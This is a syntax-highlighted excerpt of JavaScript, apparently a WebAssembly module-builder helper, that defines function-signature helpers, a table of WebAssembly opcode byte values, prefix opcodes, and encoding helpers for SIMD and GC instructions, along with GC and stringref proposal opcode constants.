<span class="hljs-keyword">let</span> kSig_s_i = <span class="hljs-title function_">makeSig</span>([kWasmI32], [kWasmS128]);
<span class="hljs-keyword">let</span> kSig_i_s = <span class="hljs-title function_">makeSig</span>([kWasmS128], [kWasmI32]);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig</span>(<span class="hljs-params">params, results</span>) {
  <span class="hljs-keyword">return</span> {<span class="hljs-attr">params</span>: params, <span class="hljs-attr">results</span>: results};
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_v_x</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x], []);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_x_v</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([], [x]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_v_xx</span>(<span class="hljs-params">x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x, x], []);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_v</span>(<span class="hljs-params">r</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([], [r]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_x</span>(<span class="hljs-params">r, x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x], [r]);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">makeSig_r_xx</span>(<span class="hljs-params">r, x</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">makeSig</span>([x, x], [r]);
}

<span class="hljs-comment">// Opcodes</span>
<span class="hljs-keyword">const</span> kWasmOpcodes = {
  <span class="hljs-string">&#x27;Unreachable&#x27;</span>: <span class="hljs-number">0x00</span>,
  <span class="hljs-string">&#x27;Nop&#x27;</span>: <span class="hljs-number">0x01</span>,
  <span class="hljs-string">&#x27;Block&#x27;</span>: <span class="hljs-number">0x02</span>,
  <span class="hljs-string">&#x27;Loop&#x27;</span>: <span class="hljs-number">0x03</span>,
  <span class="hljs-string">&#x27;If&#x27;</span>: <span class="hljs-number">0x04</span>,
  <span class="hljs-string">&#x27;Else&#x27;</span>: <span class="hljs-number">0x05</span>,
  <span class="hljs-string">&#x27;Try&#x27;</span>: <span class="hljs-number">0x06</span>,
  <span class="hljs-string">&#x27;TryTable&#x27;</span>: <span class="hljs-number">0x1f</span>,
  <span class="hljs-string">&#x27;ThrowRef&#x27;</span>: <span class="hljs-number">0x0a</span>,
  <span class="hljs-string">&#x27;Catch&#x27;</span>: <span class="hljs-number">0x07</span>,
  <span class="hljs-string">&#x27;Throw&#x27;</span>: <span class="hljs-number">0x08</span>,
  <span class="hljs-string">&#x27;Rethrow&#x27;</span>: <span class="hljs-number">0x09</span>,
  <span class="hljs-string">&#x27;CatchAll&#x27;</span>: <span class="hljs-number">0x19</span>,
  <span class="hljs-string">&#x27;End&#x27;</span>: <span class="hljs-number">0x0b</span>,
  <span class="hljs-string">&#x27;Br&#x27;</span>: <span class="hljs-number">0x0c</span>,
  <span class="hljs-string">&#x27;BrIf&#x27;</span>: <span class="hljs-number">0x0d</span>,
  <span class="hljs-string">&#x27;BrTable&#x27;</span>: <span class="hljs-number">0x0e</span>,
  <span class="hljs-string">&#x27;Return&#x27;</span>: <span class="hljs-number">0x0f</span>,
  <span class="hljs-string">&#x27;CallFunction&#x27;</span>: <span class="hljs-number">0x10</span>,
  <span class="hljs-string">&#x27;CallIndirect&#x27;</span>: <span class="hljs-number">0x11</span>,
  <span class="hljs-string">&#x27;ReturnCall&#x27;</span>: <span class="hljs-number">0x12</span>,
  <span class="hljs-string">&#x27;ReturnCallIndirect&#x27;</span>: <span class="hljs-number">0x13</span>,
  <span class="hljs-string">&#x27;CallRef&#x27;</span>: <span class="hljs-number">0x14</span>,
  <span class="hljs-string">&#x27;ReturnCallRef&#x27;</span>: <span class="hljs-number">0x15</span>,
  <span class="hljs-string">&#x27;NopForTestingUnsupportedInLiftoff&#x27;</span>: <span class="hljs-number">0x16</span>,
  <span class="hljs-string">&#x27;Delegate&#x27;</span>: <span class="hljs-number">0x18</span>,
  <span class="hljs-string">&#x27;Drop&#x27;</span>: <span class="hljs-number">0x1a</span>,
  <span class="hljs-string">&#x27;Select&#x27;</span>: <span class="hljs-number">0x1b</span>,
  <span class="hljs-string">&#x27;SelectWithType&#x27;</span>: <span class="hljs-number">0x1c</span>,
  <span class="hljs-string">&#x27;LocalGet&#x27;</span>: <span class="hljs-number">0x20</span>,
  <span class="hljs-string">&#x27;LocalSet&#x27;</span>: <span class="hljs-number">0x21</span>,
  <span class="hljs-string">&#x27;LocalTee&#x27;</span>: <span class="hljs-number">0x22</span>,
  <span class="hljs-string">&#x27;GlobalGet&#x27;</span>: <span class="hljs-number">0x23</span>,
  <span class="hljs-string">&#x27;GlobalSet&#x27;</span>: <span class="hljs-number">0x24</span>,
  <span class="hljs-string">&#x27;TableGet&#x27;</span>: <span class="hljs-number">0x25</span>,
  <span class="hljs-string">&#x27;TableSet&#x27;</span>: <span class="hljs-number">0x26</span>,
  <span class="hljs-string">&#x27;I32LoadMem&#x27;</span>: <span class="hljs-number">0x28</span>,
  <span class="hljs-string">&#x27;I64LoadMem&#x27;</span>: <span class="hljs-number">0x29</span>,
  <span class="hljs-string">&#x27;F32LoadMem&#x27;</span>: <span class="hljs-number">0x2a</span>,
  <span class="hljs-string">&#x27;F64LoadMem&#x27;</span>: <span class="hljs-number">0x2b</span>,
  <span class="hljs-string">&#x27;I32LoadMem8S&#x27;</span>: <span class="hljs-number">0x2c</span>,
  <span class="hljs-string">&#x27;I32LoadMem8U&#x27;</span>: <span class="hljs-number">0x2d</span>,
  <span class="hljs-string">&#x27;I32LoadMem16S&#x27;</span>: <span class="hljs-number">0x2e</span>,
  <span class="hljs-string">&#x27;I32LoadMem16U&#x27;</span>: <span class="hljs-number">0x2f</span>,
  <span class="hljs-string">&#x27;I64LoadMem8S&#x27;</span>: <span class="hljs-number">0x30</span>,
  <span class="hljs-string">&#x27;I64LoadMem8U&#x27;</span>: <span class="hljs-number">0x31</span>,
  <span class="hljs-string">&#x27;I64LoadMem16S&#x27;</span>: <span class="hljs-number">0x32</span>,
  <span class="hljs-string">&#x27;I64LoadMem16U&#x27;</span>: <span class="hljs-number">0x33</span>,
  <span class="hljs-string">&#x27;I64LoadMem32S&#x27;</span>: <span class="hljs-number">0x34</span>,
  <span class="hljs-string">&#x27;I64LoadMem32U&#x27;</span>: <span class="hljs-number">0x35</span>,
  <span class="hljs-string">&#x27;I32StoreMem&#x27;</span>: <span class="hljs-number">0x36</span>,
  <span class="hljs-string">&#x27;I64StoreMem&#x27;</span>: <span class="hljs-number">0x37</span>,
  <span class="hljs-string">&#x27;F32StoreMem&#x27;</span>: <span class="hljs-number">0x38</span>,
  <span class="hljs-string">&#x27;F64StoreMem&#x27;</span>: <span class="hljs-number">0x39</span>,
  <span class="hljs-string">&#x27;I32StoreMem8&#x27;</span>: <span class="hljs-number">0x3a</span>,
  <span class="hljs-string">&#x27;I32StoreMem16&#x27;</span>: <span class="hljs-number">0x3b</span>,
  <span class="hljs-string">&#x27;I64StoreMem8&#x27;</span>: <span class="hljs-number">0x3c</span>,
  <span class="hljs-string">&#x27;I64StoreMem16&#x27;</span>: <span class="hljs-number">0x3d</span>,
  <span class="hljs-string">&#x27;I64StoreMem32&#x27;</span>: <span class="hljs-number">0x3e</span>,
  <span class="hljs-string">&#x27;MemorySize&#x27;</span>: <span class="hljs-number">0x3f</span>,
  <span class="hljs-string">&#x27;MemoryGrow&#x27;</span>: <span class="hljs-number">0x40</span>,
  <span class="hljs-string">&#x27;I32Const&#x27;</span>: <span class="hljs-number">0x41</span>,
  <span class="hljs-string">&#x27;I64Const&#x27;</span>: <span class="hljs-number">0x42</span>,
  <span class="hljs-string">&#x27;F32Const&#x27;</span>: <span class="hljs-number">0x43</span>,
  <span class="hljs-string">&#x27;F64Const&#x27;</span>: <span class="hljs-number">0x44</span>,
  <span class="hljs-string">&#x27;I32Eqz&#x27;</span>: <span class="hljs-number">0x45</span>,
  <span class="hljs-string">&#x27;I32Eq&#x27;</span>: <span class="hljs-number">0x46</span>,
  <span class="hljs-string">&#x27;I32Ne&#x27;</span>: <span class="hljs-number">0x47</span>,
  <span class="hljs-string">&#x27;I32LtS&#x27;</span>: <span class="hljs-number">0x48</span>,
  <span class="hljs-string">&#x27;I32LtU&#x27;</span>: <span class="hljs-number">0x49</span>,
  <span class="hljs-string">&#x27;I32GtS&#x27;</span>: <span class="hljs-number">0x4a</span>,
  <span class="hljs-string">&#x27;I32GtU&#x27;</span>: <span class="hljs-number">0x4b</span>,
  <span class="hljs-string">&#x27;I32LeS&#x27;</span>: <span class="hljs-number">0x4c</span>,
  <span class="hljs-string">&#x27;I32LeU&#x27;</span>: <span class="hljs-number">0x4d</span>,
  <span class="hljs-string">&#x27;I32GeS&#x27;</span>: <span class="hljs-number">0x4e</span>,
  <span class="hljs-string">&#x27;I32GeU&#x27;</span>: <span class="hljs-number">0x4f</span>,
  <span class="hljs-string">&#x27;I64Eqz&#x27;</span>: <span class="hljs-number">0x50</span>,
  <span class="hljs-string">&#x27;I64Eq&#x27;</span>: <span class="hljs-number">0x51</span>,
  <span class="hljs-string">&#x27;I64Ne&#x27;</span>: <span class="hljs-number">0x52</span>,
  <span class="hljs-string">&#x27;I64LtS&#x27;</span>: <span class="hljs-number">0x53</span>,
  <span class="hljs-string">&#x27;I64LtU&#x27;</span>: <span class="hljs-number">0x54</span>,
  <span class="hljs-string">&#x27;I64GtS&#x27;</span>: <span class="hljs-number">0x55</span>,
  <span class="hljs-string">&#x27;I64GtU&#x27;</span>: <span class="hljs-number">0x56</span>,
  <span class="hljs-string">&#x27;I64LeS&#x27;</span>: <span class="hljs-number">0x57</span>,
  <span class="hljs-string">&#x27;I64LeU&#x27;</span>: <span class="hljs-number">0x58</span>,
  <span class="hljs-string">&#x27;I64GeS&#x27;</span>: <span class="hljs-number">0x59</span>,
  <span class="hljs-string">&#x27;I64GeU&#x27;</span>: <span class="hljs-number">0x5a</span>,
  <span class="hljs-string">&#x27;F32Eq&#x27;</span>: <span class="hljs-number">0x5b</span>,
  <span class="hljs-string">&#x27;F32Ne&#x27;</span>: <span class="hljs-number">0x5c</span>,
  <span class="hljs-string">&#x27;F32Lt&#x27;</span>: <span class="hljs-number">0x5d</span>,
  <span class="hljs-string">&#x27;F32Gt&#x27;</span>: <span class="hljs-number">0x5e</span>,
  <span class="hljs-string">&#x27;F32Le&#x27;</span>: <span class="hljs-number">0x5f</span>,
  <span class="hljs-string">&#x27;F32Ge&#x27;</span>: <span class="hljs-number">0x60</span>,
  <span class="hljs-string">&#x27;F64Eq&#x27;</span>: <span class="hljs-number">0x61</span>,
  <span class="hljs-string">&#x27;F64Ne&#x27;</span>: <span class="hljs-number">0x62</span>,
  <span class="hljs-string">&#x27;F64Lt&#x27;</span>: <span class="hljs-number">0x63</span>,
  <span class="hljs-string">&#x27;F64Gt&#x27;</span>: <span class="hljs-number">0x64</span>,
  <span class="hljs-string">&#x27;F64Le&#x27;</span>: <span class="hljs-number">0x65</span>,
  <span class="hljs-string">&#x27;F64Ge&#x27;</span>: <span class="hljs-number">0x66</span>,
  <span class="hljs-string">&#x27;I32Clz&#x27;</span>: <span class="hljs-number">0x67</span>,
  <span class="hljs-string">&#x27;I32Ctz&#x27;</span>: <span class="hljs-number">0x68</span>,
  <span class="hljs-string">&#x27;I32Popcnt&#x27;</span>: <span class="hljs-number">0x69</span>,
  <span class="hljs-string">&#x27;I32Add&#x27;</span>: <span class="hljs-number">0x6a</span>,
  <span class="hljs-string">&#x27;I32Sub&#x27;</span>: <span class="hljs-number">0x6b</span>,
  <span class="hljs-string">&#x27;I32Mul&#x27;</span>: <span class="hljs-number">0x6c</span>,
  <span class="hljs-string">&#x27;I32DivS&#x27;</span>: <span class="hljs-number">0x6d</span>,
  <span class="hljs-string">&#x27;I32DivU&#x27;</span>: <span class="hljs-number">0x6e</span>,
  <span class="hljs-string">&#x27;I32RemS&#x27;</span>: <span class="hljs-number">0x6f</span>,
  <span class="hljs-string">&#x27;I32RemU&#x27;</span>: <span class="hljs-number">0x70</span>,
  <span class="hljs-string">&#x27;I32And&#x27;</span>: <span class="hljs-number">0x71</span>,
  <span class="hljs-string">&#x27;I32Ior&#x27;</span>: <span class="hljs-number">0x72</span>,
  <span class="hljs-string">&#x27;I32Xor&#x27;</span>: <span class="hljs-number">0x73</span>,
  <span class="hljs-string">&#x27;I32Shl&#x27;</span>: <span class="hljs-number">0x74</span>,
  <span class="hljs-string">&#x27;I32ShrS&#x27;</span>: <span class="hljs-number">0x75</span>,
  <span class="hljs-string">&#x27;I32ShrU&#x27;</span>: <span class="hljs-number">0x76</span>,
  <span class="hljs-string">&#x27;I32Rol&#x27;</span>: <span class="hljs-number">0x77</span>,
  <span class="hljs-string">&#x27;I32Ror&#x27;</span>: <span class="hljs-number">0x78</span>,
  <span class="hljs-string">&#x27;I64Clz&#x27;</span>: <span class="hljs-number">0x79</span>,
  <span class="hljs-string">&#x27;I64Ctz&#x27;</span>: <span class="hljs-number">0x7a</span>,
  <span class="hljs-string">&#x27;I64Popcnt&#x27;</span>: <span class="hljs-number">0x7b</span>,
  <span class="hljs-string">&#x27;I64Add&#x27;</span>: <span class="hljs-number">0x7c</span>,
  <span class="hljs-string">&#x27;I64Sub&#x27;</span>: <span class="hljs-number">0x7d</span>,
  <span class="hljs-string">&#x27;I64Mul&#x27;</span>: <span class="hljs-number">0x7e</span>,
  <span class="hljs-string">&#x27;I64DivS&#x27;</span>: <span class="hljs-number">0x7f</span>,
  <span class="hljs-string">&#x27;I64DivU&#x27;</span>: <span class="hljs-number">0x80</span>,
  <span class="hljs-string">&#x27;I64RemS&#x27;</span>: <span class="hljs-number">0x81</span>,
  <span class="hljs-string">&#x27;I64RemU&#x27;</span>: <span class="hljs-number">0x82</span>,
  <span class="hljs-string">&#x27;I64And&#x27;</span>: <span class="hljs-number">0x83</span>,
  <span class="hljs-string">&#x27;I64Ior&#x27;</span>: <span class="hljs-number">0x84</span>,
  <span class="hljs-string">&#x27;I64Xor&#x27;</span>: <span class="hljs-number">0x85</span>,
  <span class="hljs-string">&#x27;I64Shl&#x27;</span>: <span class="hljs-number">0x86</span>,
  <span class="hljs-string">&#x27;I64ShrS&#x27;</span>: <span class="hljs-number">0x87</span>,
  <span class="hljs-string">&#x27;I64ShrU&#x27;</span>: <span class="hljs-number">0x88</span>,
  <span class="hljs-string">&#x27;I64Rol&#x27;</span>: <span class="hljs-number">0x89</span>,
  <span class="hljs-string">&#x27;I64Ror&#x27;</span>: <span class="hljs-number">0x8a</span>,
  <span class="hljs-string">&#x27;F32Abs&#x27;</span>: <span class="hljs-number">0x8b</span>,
  <span class="hljs-string">&#x27;F32Neg&#x27;</span>: <span class="hljs-number">0x8c</span>,
  <span class="hljs-string">&#x27;F32Ceil&#x27;</span>: <span class="hljs-number">0x8d</span>,
  <span class="hljs-string">&#x27;F32Floor&#x27;</span>: <span class="hljs-number">0x8e</span>,
  <span class="hljs-string">&#x27;F32Trunc&#x27;</span>: <span class="hljs-number">0x8f</span>,
  <span class="hljs-string">&#x27;F32NearestInt&#x27;</span>: <span class="hljs-number">0x90</span>,
  <span class="hljs-string">&#x27;F32Sqrt&#x27;</span>: <span class="hljs-number">0x91</span>,
  <span class="hljs-string">&#x27;F32Add&#x27;</span>: <span class="hljs-number">0x92</span>,
  <span class="hljs-string">&#x27;F32Sub&#x27;</span>: <span class="hljs-number">0x93</span>,
  <span class="hljs-string">&#x27;F32Mul&#x27;</span>: <span class="hljs-number">0x94</span>,
  <span class="hljs-string">&#x27;F32Div&#x27;</span>: <span class="hljs-number">0x95</span>,
  <span class="hljs-string">&#x27;F32Min&#x27;</span>: <span class="hljs-number">0x96</span>,
  <span class="hljs-string">&#x27;F32Max&#x27;</span>: <span class="hljs-number">0x97</span>,
  <span class="hljs-string">&#x27;F32CopySign&#x27;</span>: <span class="hljs-number">0x98</span>,
  <span class="hljs-string">&#x27;F64Abs&#x27;</span>: <span class="hljs-number">0x99</span>,
  <span class="hljs-string">&#x27;F64Neg&#x27;</span>: <span class="hljs-number">0x9a</span>,
  <span class="hljs-string">&#x27;F64Ceil&#x27;</span>: <span class="hljs-number">0x9b</span>,
  <span class="hljs-string">&#x27;F64Floor&#x27;</span>: <span class="hljs-number">0x9c</span>,
  <span class="hljs-string">&#x27;F64Trunc&#x27;</span>: <span class="hljs-number">0x9d</span>,
  <span class="hljs-string">&#x27;F64NearestInt&#x27;</span>: <span class="hljs-number">0x9e</span>,
  <span class="hljs-string">&#x27;F64Sqrt&#x27;</span>: <span class="hljs-number">0x9f</span>,
  <span class="hljs-string">&#x27;F64Add&#x27;</span>: <span class="hljs-number">0xa0</span>,
  <span class="hljs-string">&#x27;F64Sub&#x27;</span>: <span class="hljs-number">0xa1</span>,
  <span class="hljs-string">&#x27;F64Mul&#x27;</span>: <span class="hljs-number">0xa2</span>,
  <span class="hljs-string">&#x27;F64Div&#x27;</span>: <span class="hljs-number">0xa3</span>,
  <span class="hljs-string">&#x27;F64Min&#x27;</span>: <span class="hljs-number">0xa4</span>,
  <span class="hljs-string">&#x27;F64Max&#x27;</span>: <span class="hljs-number">0xa5</span>,
  <span class="hljs-string">&#x27;F64CopySign&#x27;</span>: <span class="hljs-number">0xa6</span>,
  <span class="hljs-string">&#x27;I32ConvertI64&#x27;</span>: <span class="hljs-number">0xa7</span>,
  <span class="hljs-string">&#x27;I32SConvertF32&#x27;</span>: <span class="hljs-number">0xa8</span>,
  <span class="hljs-string">&#x27;I32UConvertF32&#x27;</span>: <span class="hljs-number">0xa9</span>,
  <span class="hljs-string">&#x27;I32SConvertF64&#x27;</span>: <span class="hljs-number">0xaa</span>,
  <span class="hljs-string">&#x27;I32UConvertF64&#x27;</span>: <span class="hljs-number">0xab</span>,
  <span class="hljs-string">&#x27;I64SConvertI32&#x27;</span>: <span class="hljs-number">0xac</span>,
  <span class="hljs-string">&#x27;I64UConvertI32&#x27;</span>: <span class="hljs-number">0xad</span>,
  <span class="hljs-string">&#x27;I64SConvertF32&#x27;</span>: <span class="hljs-number">0xae</span>,
  <span class="hljs-string">&#x27;I64UConvertF32&#x27;</span>: <span class="hljs-number">0xaf</span>,
  <span class="hljs-string">&#x27;I64SConvertF64&#x27;</span>: <span class="hljs-number">0xb0</span>,
  <span class="hljs-string">&#x27;I64UConvertF64&#x27;</span>: <span class="hljs-number">0xb1</span>,
  <span class="hljs-string">&#x27;F32SConvertI32&#x27;</span>: <span class="hljs-number">0xb2</span>,
  <span class="hljs-string">&#x27;F32UConvertI32&#x27;</span>: <span class="hljs-number">0xb3</span>,
  <span class="hljs-string">&#x27;F32SConvertI64&#x27;</span>: <span class="hljs-number">0xb4</span>,
  <span class="hljs-string">&#x27;F32UConvertI64&#x27;</span>: <span class="hljs-number">0xb5</span>,
  <span class="hljs-string">&#x27;F32ConvertF64&#x27;</span>: <span class="hljs-number">0xb6</span>,
  <span class="hljs-string">&#x27;F64SConvertI32&#x27;</span>: <span class="hljs-number">0xb7</span>,
  <span class="hljs-string">&#x27;F64UConvertI32&#x27;</span>: <span class="hljs-number">0xb8</span>,
  <span class="hljs-string">&#x27;F64SConvertI64&#x27;</span>: <span class="hljs-number">0xb9</span>,
  <span class="hljs-string">&#x27;F64UConvertI64&#x27;</span>: <span class="hljs-number">0xba</span>,
  <span class="hljs-string">&#x27;F64ConvertF32&#x27;</span>: <span class="hljs-number">0xbb</span>,
  <span class="hljs-string">&#x27;I32ReinterpretF32&#x27;</span>: <span class="hljs-number">0xbc</span>,
  <span class="hljs-string">&#x27;I64ReinterpretF64&#x27;</span>: <span class="hljs-number">0xbd</span>,
  <span class="hljs-string">&#x27;F32ReinterpretI32&#x27;</span>: <span class="hljs-number">0xbe</span>,
  <span class="hljs-string">&#x27;F64ReinterpretI64&#x27;</span>: <span class="hljs-number">0xbf</span>,
  <span class="hljs-string">&#x27;I32SExtendI8&#x27;</span>: <span class="hljs-number">0xc0</span>,
  <span class="hljs-string">&#x27;I32SExtendI16&#x27;</span>: <span class="hljs-number">0xc1</span>,
  <span class="hljs-string">&#x27;I64SExtendI8&#x27;</span>: <span class="hljs-number">0xc2</span>,
  <span class="hljs-string">&#x27;I64SExtendI16&#x27;</span>: <span class="hljs-number">0xc3</span>,
  <span class="hljs-string">&#x27;I64SExtendI32&#x27;</span>: <span class="hljs-number">0xc4</span>,
  <span class="hljs-string">&#x27;RefNull&#x27;</span>: <span class="hljs-number">0xd0</span>,
  <span class="hljs-string">&#x27;RefIsNull&#x27;</span>: <span class="hljs-number">0xd1</span>,
  <span class="hljs-string">&#x27;RefFunc&#x27;</span>: <span class="hljs-number">0xd2</span>,
  <span class="hljs-string">&#x27;RefEq&#x27;</span>: <span class="hljs-number">0xd3</span>,
  <span class="hljs-string">&#x27;RefAsNonNull&#x27;</span>: <span class="hljs-number">0xd4</span>,
  <span class="hljs-string">&#x27;BrOnNull&#x27;</span>: <span class="hljs-number">0xd5</span>,
  <span class="hljs-string">&#x27;BrOnNonNull&#x27;</span>: <span class="hljs-number">0xd6</span>,
  <span class="hljs-string">&#x27;ContNew&#x27;</span>: <span class="hljs-number">0xe0</span>,
  <span class="hljs-string">&#x27;ContBind&#x27;</span>: <span class="hljs-number">0xe1</span>,
  <span class="hljs-string">&#x27;Suspend&#x27;</span>: <span class="hljs-number">0xe2</span>,
  <span class="hljs-string">&#x27;Resume&#x27;</span>: <span class="hljs-number">0xe3</span>,
  <span class="hljs-string">&#x27;ResumeThrow&#x27;</span>: <span class="hljs-number">0xe4</span>,
  <span class="hljs-string">&#x27;ResumeThrowRef&#x27;</span>: <span class="hljs-number">0xe5</span>,
  <span class="hljs-string">&#x27;Switch&#x27;</span>: <span class="hljs-number">0xe6</span>
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-params">name, value</span>) {
  <span class="hljs-keyword">if</span> (globalThis.<span class="hljs-property">kWasmOpcodeNames</span> === <span class="hljs-literal">undefined</span>) {
    globalThis.<span class="hljs-property">kWasmOpcodeNames</span> = {};
  }
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(globalThis, name, {<span class="hljs-attr">value</span>: value});
  <span class="hljs-keyword">if</span> (globalThis.<span class="hljs-property">kWasmOpcodeNames</span>[value] !== <span class="hljs-literal">undefined</span>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Duplicate wasm opcode: <span class="hljs-subst">${value}</span>. Previous name: <span class="hljs-subst">${
        globalThis.kWasmOpcodeNames[value]}</span>, new name: <span class="hljs-subst">${name}</span>`</span>);
  }
  globalThis.<span class="hljs-property">kWasmOpcodeNames</span>[value] = name;
}
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> name <span class="hljs-keyword">in</span> kWasmOpcodes) {
  <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-string">`kExpr<span class="hljs-subst">${name}</span>`</span>, kWasmOpcodes[name]);
}

<span class="hljs-comment">// Prefix opcodes</span>
<span class="hljs-keyword">const</span> kPrefixOpcodes = {
  <span class="hljs-string">&#x27;GC&#x27;</span>: <span class="hljs-number">0xfb</span>,
  <span class="hljs-string">&#x27;Numeric&#x27;</span>: <span class="hljs-number">0xfc</span>,
  <span class="hljs-string">&#x27;Simd&#x27;</span>: <span class="hljs-number">0xfd</span>,
  <span class="hljs-string">&#x27;Atomic&#x27;</span>: <span class="hljs-number">0xfe</span>
};
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prefix <span class="hljs-keyword">in</span> kPrefixOpcodes) {
  <span class="hljs-title function_">defineWasmOpcode</span>(<span class="hljs-string">`k<span class="hljs-subst">${prefix}</span>Prefix`</span>, kPrefixOpcodes[prefix]);
}

<span class="hljs-comment">// Use these for multi-byte instructions (opcode &gt; 0x7F needing two LEB bytes):</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">SimdInstr</span>(<span class="hljs-params">opcode</span>) {
  <span class="hljs-keyword">if</span> (opcode &lt;= <span class="hljs-number">0x7F</span>) <span class="hljs-keyword">return</span> [kSimdPrefix, opcode];
  <span class="hljs-keyword">return</span> [kSimdPrefix, <span class="hljs-number">0x80</span> | (opcode &amp; <span class="hljs-number">0x7F</span>), opcode &gt;&gt; <span class="hljs-number">7</span>];
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">GCInstr</span>(<span class="hljs-params">opcode</span>) {
  <span class="hljs-keyword">if</span> (opcode &lt;= <span class="hljs-number">0x7F</span>) <span class="hljs-keyword">return</span> [kGCPrefix, opcode];
  <span class="hljs-keyword">return</span> [kGCPrefix, <span class="hljs-number">0x80</span> | (opcode &amp; <span class="hljs-number">0x7F</span>), opcode &gt;&gt; <span class="hljs-number">7</span>];
}

<span class="hljs-comment">// GC opcodes</span>
<span class="hljs-keyword">let</span> kExprStructNew = <span class="hljs-number">0x00</span>;
<span class="hljs-keyword">let</span> kExprStructNewDefault = <span class="hljs-number">0x01</span>;
<span class="hljs-keyword">let</span> kExprStructGet = <span class="hljs-number">0x02</span>;
<span class="hljs-keyword">let</span> kExprStructGetS = <span class="hljs-number">0x03</span>;
<span class="hljs-keyword">let</span> kExprStructGetU = <span class="hljs-number">0x04</span>;
<span class="hljs-keyword">let</span> kExprStructSet = <span class="hljs-number">0x05</span>;
<span class="hljs-keyword">let</span> kExprArrayNew = <span class="hljs-number">0x06</span>;
<span class="hljs-keyword">let</span> kExprArrayNewDefault = <span class="hljs-number">0x07</span>;
<span class="hljs-keyword">let</span> kExprArrayNewFixed = <span class="hljs-number">0x08</span>;
<span class="hljs-keyword">let</span> kExprArrayNewData = <span class="hljs-number">0x09</span>;
<span class="hljs-keyword">let</span> kExprArrayNewElem = <span class="hljs-number">0x0a</span>;
<span class="hljs-keyword">let</span> kExprArrayGet = <span class="hljs-number">0x0b</span>;
<span class="hljs-keyword">let</span> kExprArrayGetS = <span class="hljs-number">0x0c</span>;
<span class="hljs-keyword">let</span> kExprArrayGetU = <span class="hljs-number">0x0d</span>;
<span class="hljs-keyword">let</span> kExprArraySet = <span class="hljs-number">0x0e</span>;
<span class="hljs-keyword">let</span> kExprArrayLen = <span class="hljs-number">0x0f</span>;
<span class="hljs-keyword">let</span> kExprArrayFill = <span class="hljs-number">0x10</span>;
<span class="hljs-keyword">let</span> kExprArrayCopy = <span class="hljs-number">0x11</span>;
<span class="hljs-keyword">let</span> kExprArrayInitData = <span class="hljs-number">0x12</span>;
<span class="hljs-keyword">let</span> kExprArrayInitElem = <span class="hljs-number">0x13</span>;
<span class="hljs-keyword">let</span> kExprRefTest = <span class="hljs-number">0x14</span>;
<span class="hljs-keyword">let</span> kExprRefTestNull = <span class="hljs-number">0x15</span>;
<span class="hljs-keyword">let</span> kExprRefCast = <span class="hljs-number">0x16</span>;
<span class="hljs-keyword">let</span> kExprRefCastNull = <span class="hljs-number">0x17</span>;
<span class="hljs-keyword">let</span> kExprBrOnCast = <span class="hljs-number">0x18</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastFail = <span class="hljs-number">0x19</span>;
<span class="hljs-keyword">let</span> kExprAnyConvertExtern = <span class="hljs-number">0x1a</span>;
<span class="hljs-keyword">let</span> kExprExternConvertAny = <span class="hljs-number">0x1b</span>;
<span class="hljs-keyword">let</span> kExprRefI31 = <span class="hljs-number">0x1c</span>;
<span class="hljs-keyword">let</span> kExprI31GetS = <span class="hljs-number">0x1d</span>;
<span class="hljs-keyword">let</span> kExprI31GetU = <span class="hljs-number">0x1e</span>;
<span class="hljs-keyword">let</span> kExprRefI31Shared = <span class="hljs-number">0x1f</span>;
<span class="hljs-comment">// Custom Descriptors proposal:</span>
<span class="hljs-keyword">let</span> kExprRefGetDesc = <span class="hljs-number">0x22</span>;
<span class="hljs-keyword">let</span> kExprRefCastDesc = <span class="hljs-number">0x23</span>;
<span class="hljs-keyword">let</span> kExprRefCastDescNull = <span class="hljs-number">0x24</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastDesc = <span class="hljs-number">0x25</span>;
<span class="hljs-keyword">let</span> kExprBrOnCastDescFail = <span class="hljs-number">0x26</span>;

<span class="hljs-keyword">let</span> kExprRefCastNop = <span class="hljs-number">0x4c</span>;

<span class="hljs-comment">// Stringref proposal.</span>
<span class="hljs-keyword">let</span> kExprStringNewUtf8 = <span class="hljs-number">0x80</span>;
<span class="hljs-keyword">let</span> kExprStringNewWtf16 = <span class="hljs-number">0x81</span>;
<span class="hljs-keyword">let</span> kExprStringConst = <span class="hljs-number">0x82</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureUtf8 = <span class="hljs-number">0x83</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureWtf8 = <span class="hljs-number">0x84</span>;
<span class="hljs-keyword">let</span> kExprStringMeasureWtf16 = <span class="hljs-number">0x85</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeUtf8 = <span class="hljs-number">0x86</span>;
<span class="hljs-keyword">let</span> kExprStringEncodeWtf16 = <span class="hljs-number">0x87</span>;
<span class="hljs-keyword">let</span> kExprStringConcat = <span class="hljs-number">0x88</span>;
<span class="hljs-keyword">let</span> kExprStringEq = <span class="hljs-number">0x89</span>;
<span class="hljs-keyword">let</span> kExprStringIsUsvSequence = <span class="hljs-number">0x8a</span>;
<span class="hljs-keyword">let</span> kExprStringNewLossyUtf8 = <span class="hljs-number">0x8b</span>;
